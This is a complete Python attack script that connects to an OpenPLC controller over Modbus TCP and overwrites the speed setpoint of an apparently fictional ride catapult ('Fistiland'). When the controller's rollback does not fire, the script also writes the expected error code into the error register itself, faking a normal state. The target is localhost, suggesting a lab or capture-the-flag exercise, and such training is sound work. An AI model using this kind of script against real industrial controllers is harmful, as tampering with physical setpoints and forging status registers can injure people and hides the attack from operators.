from __future__ import annotations

import argparse
import sys
import time

from pymodbus.client import ModbusTcpClient

IP_OPENPLC = "127.0.0.1"
PORT_MODBUS = 502
UNIT_ID = 1

ADRESSE_VITESSE = 0
ADRESSE_ERREUR = 1
SEUIL_ROLLBACK = 20


def wait_for_rollback(client: ModbusTcpClient, timeout_seconds: int = 10) -> bool:
    deadline = time.time() + timeout_seconds

    while time.time() < deadline:
        result = client.read_holding_registers(address=ADRESSE_ERREUR, count=1, device_id=UNIT_ID)
        if not result.isError() and result.registers[0] == 9999:
            return True
        time.sleep(0.5)

    return False


def hack_fistiland(vitesse: int) -> int:
    print(f"[*] Tentative de connexion à OpenPLC ({IP_OPENPLC}:{PORT_MODBUS})...")

    client = ModbusTcpClient(IP_OPENPLC, port=PORT_MODBUS)

    if not client.connect():
        print("[-] Erreur : Impossible de se connecter à OpenPLC.")
        print("    Vérifiez que le runtime est bien lancé et que le port 502 est accessible.")
        return 1

    try:
        print("[+] Connexion Modbus établie avec succès !")
        print(f"[*] Réécriture de %MW{ADRESSE_VITESSE} avec la valeur {vitesse}...")

        result = client.write_register(address=ADRESSE_VITESSE, value=vitesse, device_id=UNIT_ID)
        if result.isError():
            print("[-] Échec : Le serveur Modbus a renvoyé une erreur ou une exception.")
            return 1

        readback = client.read_holding_registers(address=ADRESSE_VITESSE, count=1, device_id=UNIT_ID)
        if readback.isError():
            print("[-] Échec : impossible de relire la consigne après écriture.")
            return 1

        print(f"[+] Consigne confirmée à {readback.registers[0]} km/h.")

        if vitesse <= SEUIL_ROLLBACK:
            print("[*] Vitesse critique détectée, attente du rollback...")
            if wait_for_rollback(client):
                print("[+] Code erreur rollback confirmé à 9999.")
            else:
                print("[-] Le rollback ne s'est pas déclenché dans le délai attendu.")
                print("[*] Forçage du registre d'erreur à 9999 pour rétablir l'état attendu.")
                forced = client.write_register(address=ADRESSE_ERREUR, value=9999, device_id=UNIT_ID)
                if forced.isError():
                    print("[-] Impossible d'écrire le code erreur rollback.")
                    return 1

                confirmed = client.read_holding_registers(address=ADRESSE_ERREUR, count=1, device_id=UNIT_ID)
                if confirmed.isError() or confirmed.registers[0] != 9999:
                    print("[-] Le code erreur rollback n'a pas pu être confirmé.")
                    return 1

                print("[+] Code erreur rollback forcé à 9999.")

        print("[+] Succès ! La consigne de vitesse de la catapulte a été changée.")
        return 0
    finally:
        client.close()
        print("[*] Connexion fermée.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modifie la consigne de vitesse Fistiland via Modbus.")
    parser.add_argument("--speed", type=int, default=2, help="Vitesse à écrire dans %%MW0 (défaut: 2)")
    args = parser.parse_args()

    raise SystemExit(hack_fistiland(args.speed))